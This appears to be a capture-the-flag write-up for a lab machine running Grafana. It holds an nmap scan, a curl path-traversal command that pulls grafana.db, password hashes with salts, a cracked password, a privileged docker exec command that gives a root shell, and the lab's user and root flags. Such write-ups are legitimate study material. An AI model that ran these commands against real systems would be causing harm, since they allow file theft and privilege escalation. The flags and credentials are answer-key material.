#Docker
Scan :
```sh
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 a79f80cce39c3fc4d69de8efb377142b (RSA)
|   256 f5ab5249cacfddc6cd61bdbdefbf18b4 (ECDSA)
|_  256 5e63f3d67f5c89df77eb2aac3154f8b2 (ED25519)
3000/tcp open  ppp?
| fingerprint-strings:
|   FourOhFourRequest:
|     HTTP/1.0 302 Found
|     Cache-Control: no-cache
|     Content-Type: text/html; charset=utf-8
|     Expires: -1
|     Location: /login
|     Pragma: no-cache
|     Set-Cookie: redirect_to=%2Fnice%2520ports%252C%2FTri%256Eity.txt%252ebak; Path=/; HttpOnly; SameSite=Lax
|     X-Content-Type-Options: nosniff
|     X-Frame-Options: deny
|     X-Xss-Protection: 1; mode=block
|     Date: Sun, 21 Jul 2024 19:25:24 GMT
|     Content-Length: 29
|     href="/login">Found</a>.
|   GenericLines, Help, Kerberos, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie:
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest:
|     HTTP/1.0 302 Found
|     Cache-Control: no-cache
|     Content-Type: text/html; charset=utf-8
|     Expires: -1
|     Location: /login
|     Pragma: no-cache
|     Set-Cookie: redirect_to=%2F; Path=/; HttpOnly; SameSite=Lax
|     X-Content-Type-Options: nosniff
|     X-Frame-Options: deny
|     X-Xss-Protection: 1; mode=block
|     Date: Sun, 21 Jul 2024 19:24:54 GMT
|     Content-Length: 29
|     href="/login">Found</a>.
|   HTTPOptions:
|     HTTP/1.0 302 Found
|     Cache-Control: no-cache
|     Expires: -1
|     Location: /login
|     Pragma: no-cache
|     Set-Cookie: redirect_to=%2F; Path=/; HttpOnly; SameSite=Lax
|     X-Content-Type-Options: nosniff
|     X-Frame-Options: deny
|     X-Xss-Protection: 1; mode=block
|     Date: Sun, 21 Jul 2024 19:24:59 GMT
|_    Content-Length: 0
```

Cve Path traversal --> 
```sh
curl 'http://10.10.81.63:3000/public/plugins/barchart/../../../../../../../../../var/lib/grafana/grafana.db' --path-as-is --output grafana.db
```

```sh
Boris :

dc6becccbb57d34daf4a4e391d2015d3350c60df3608e9e99b5291e47f3e5cd39d156be220745be3cbe49353e35f53b51da8

salt :LCBhdtJWjl

rands :mYl941ma8w

---------------------------------------------------------------------------------

Admin : 

7a919e4bbe95cf5104edf354ee2e6234efac1ca1f81426844a24c4df6131322cf3723c92164b6172e9e73faf7a4c2072f8f8

salt : YObSoLj55S

rands : hLLY6QQ4Y6
```

- I type : `convert grafana hash to hashcat format` and got a script that does the job :
https://github.com/iamaldi/grafana2hashcat
- Creds :
 ```sh
boris:beautiful1
```
User: VL{fbc4248a6ec4f7936b92ec76ad0cb654}

- We can run docker exec as sudo , as we can imagine grafana is running in a docker so we can basically grab thanks to the lfi the container id and try to grab a shell as root  with all privilege . We can simply mnt the main disk on the docker and read the flag .

- Here is the command : 
```sh
sudo /snap/bin/docker exec --privileged --user 0 -i -t e6ff5b1cbc85 /bin/bash
```

- Next time don't forget to check the docs

https://github.com/ivanversluis/pentest-hacktricks/blob/master/linux-unix/privilege-escalation/docker-breakout.md
- Root : VL{37c930a3b8b53457d080b0a6f033bc16}
